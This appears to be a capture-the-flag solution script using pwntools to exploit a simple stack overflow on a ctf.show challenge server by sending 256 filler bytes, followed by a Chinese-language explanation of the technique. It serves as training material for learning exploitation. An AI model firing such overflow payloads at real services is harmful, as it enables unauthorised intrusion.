from pwn import *

io = remote("pwn.challenge.ctf.show", 28290)

# flagishere = 0xb94：可能是flag的地址或相关变量
flagishere = 0xb94

# 等待提示信息，发送"Yes"
io.recvuntil("Input 'Yes' or 'No': ")
io.sendline("Yes")

# 等待提示信息，发送payload
io.recvuntil("Tell me you want: ")

# payload = b'a' * 0x100：构造攻击载荷，发送256个'a'
payload = b'a' * 0x100

io.sendline(payload)
io.interactive()

"""
【知识点讲解】
1. 题目类型：stack overflow - 简单栈溢出
2. 核心原理：
   - 利用栈溢出漏洞覆盖栈上的数据
   - 发送足够长度的payload触发溢出
3. 执行流程：
   - 发送"Yes"响应初始提示
   - 发送长度为0x100的payload触发栈溢出
   - 可能通过溢出覆盖返回地址或其他关键数据
4. 技术要点：
   - 简单栈溢出的利用
   - 理解程序的输入处理逻辑
"""
